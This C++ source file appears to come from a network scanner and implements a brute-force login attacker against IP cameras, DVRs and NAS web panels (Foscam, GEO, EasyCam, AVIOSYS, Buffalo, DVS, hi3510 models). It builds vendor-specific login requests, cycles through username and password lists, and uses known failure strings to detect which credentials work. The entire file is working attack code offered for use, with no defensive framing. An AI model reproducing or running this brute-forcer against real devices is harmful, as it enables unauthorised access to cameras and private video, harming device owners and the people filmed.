#include "IPCAuth.h"
#include "Utils.h"
#include "BruteUtils.h"
#include "FileUpdater.h"

lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
{
    lopaStr lps;
    bool result = true;
    ZeroMemory(lps.login, sizeof(lps.login));
    ZeroMemory(lps.pass, sizeof(lps.pass));
    ZeroMemory(lps.other, sizeof(lps.other));
    char login[128] = {0};
    char pass[128] = {0};
    char request[1024] = {0};
    int passCounter = 1;

    std::vector<char*> negVector;
    if(strcmp(SPEC, "IPC") == 0)
    {
        negVector.push_back("<UserGroup>Invalid</UserGroup>");
    }
    else if(strcmp(SPEC, "GEO") == 0)
    {
        negVector.push_back("Access denied");
        negVector.push_back("ErrNoSuchUsr.htm");
    }
    else if(strcmp(SPEC, "EasyCam") == 0)
    {
        negVector.push_back("Set-Cookie: usrLevel=-1;path=/");
    }
    else if(strcmp(SPEC, "Foscam") == 0)
    {
        negVector.push_back("<result>0</result>");
        negVector.push_back("<result>-1</result>");
        negVector.push_back("<result>-2</result>");
        negVector.push_back("<result>-3</result>");
        negVector.push_back("<result>-4</result>");
        negVector.push_back("<result>-5</result>");
        negVector.push_back("<result>-6</result>");
        negVector.push_back("<result>-7</result>");
    }
    else if(strcmp(SPEC, "AVIOSYS") == 0)
    {
        negVector.push_back("Password Error");
    }
    else if(strcmp(SPEC, "BUFFALO") == 0)
    {
        negVector.push_back("403 Forbidden");
    }
    else if(strcmp(SPEC, "DVS") == 0)
    {
        negVector.push_back("Non-Existed");
    }
    else if(strcmp(SPEC, "IPCAM") == 0)
    {
        negVector.push_back("var check=\"0\"");
        negVector.push_back("var authLevel =\"0\";");
    }
    else if(strcmp(SPEC, "IEORFOREFOX") == 0)
    {
        negVector.push_back("AAA()");
        negVector.push_back("РРјСЏ РёР»Рё РїР°СЂРѕР»СЊ РЅРµРІРµСЂРЅС‹Рµ!");
        negVector.push_back("Р’РѕР·РІСЂР°С‚");
        negVector.push_back("HTTP/1.0 302 Found");
        negVector.push_back("is incorrect");
    }
    else
    {
        stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");

        strcpy(lps.login, "UNKNOWN");
        return lps;
    };

    for(int i = 0; i < MaxLogin; i++)
    {
        if(!globalScanFlag) break;
        if(strcmp(loginLst[i], " ") == 0) continue;
        ZeroMemory(login, sizeof(login));
        strcpy(login, loginLst[i]);

        for(int j = 0; j < MaxPass; j++)
        {
            FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready;});
            if(!globalScanFlag) break;
            if(strcmp(passLst[j], " ") == 0) continue;

            ZeroMemory(pass, sizeof(pass));
            strcpy(pass, passLst[j]);

            ZeroMemory(request, sizeof(request));
            if(strcmp(SPEC, "IPC") == 0)
            {
                sprintf(request, "%s:%d/login.xml?user=%s&usr=%s&password=%s&pwd=%s",
                        ip, port, login, login, pass, pass);
            }
            else if(strcmp(SPEC, "GEO") == 0)
            {
                sprintf(request, "%s:%d/Login.cgi?username=%s&password=%s",
                        ip, port, login, pass);
            }
            else if(strcmp(SPEC, "EasyCam") == 0)
            {
                sprintf(request, "%s:%d/login.xml?user=%s&usr=%s&password=%s&pwd=%s",
                        ip, port, login, login, pass, pass);
            }
            else if(strcmp(SPEC, "Foscam") == 0)
            {
                sprintf(request, "%s:%d/cgi-bin/CGIProxy.fcgi?usr=%s&pwd=%s&cmd=logIn&usrName=%s&pwd=%s",
                        ip, port, login, pass, login, pass);
            }
            else if(strcmp(SPEC, "AVIOSYS") == 0)
            {
                sprintf(request, "%s:%d/check_user.html?UserName=%s&PassWord=%s",
                        ip, port, login, pass);
            }
            else if(strcmp(SPEC, "IPCAM") == 0)
            {
                sprintf(request, "%s:%d/cgi-bin/hi3510/checkuser.cgi?&-name=%s&-passwd=%s&-time=1416767330831",
                        ip, port, login, pass);
            }
            else if(strcmp(SPEC, "IEORFOREFOX") == 0)
            {
                doPost = true;
                sprintf(request, "%s:%d/logincheck.rsp?type=1", ip, port);
                sprintf(postData, "username=%s&userpwd=%s", login, pass);
            }
            else if(strcmp(SPEC, "BUFFALO") == 0)
            {
                doPost = true;
                sprintf(request, "%s:%d/rpc/login", ip, port);
                sprintf(postData, "user=%s&password=%s", login, pass);
            }
            else if(strcmp(SPEC, "DVS") == 0)
            {
                doPost = true;
                sprintf(request, "%s:%d/login", ip, port);
                sprintf(postData, "langs=en&user=%s&password=%s&submit=+Login+", login, pass);
            }

            std::string buffer;
            if(doPost) {
                if (Connector::nConnect(request, port, &buffer, postData) == -2) return lps;
            } else {
                if (Connector::nConnect(request, port, &buffer) == -2) return lps;
            }

            for(int i = 0; i < negVector.size(); ++i)
            {
                if(Utils::ci_find_substr(buffer, negVector[i]) != -1)
                {
                    result = false;
                    break;
                };
            };

            if(result)
            {
                strcpy(lps.login, loginLst[i]);
                strcpy(lps.pass, passLst[j]);
                return lps;
            };

            ++passCounter;

            if (BALogSwitched) stt->doEmitionBAData("IPC: " + QString(ip) + ":" + QString::number(port) +
                "; l/p: " + QString(login) + ":" + QString(pass) + ";	- Progress: (" +
                QString::number((++passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");

            Sleep(100);
        };
    };

    strcpy(lps.login, "UNKNOWN");
    return lps;
}

lopaStr IPC::IPCLobby(const char *ip, int port, char *SPEC) {
    if(gMaxBrutingThreads > 0) {
        while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

        BruteUtils::BConInc();
        lopaStr lps = IPCBrute(ip, port, SPEC);
        BruteUtils::BConDec();

        return lps;
    } else {
        lopaStr lps;
        return lps;
    }
}
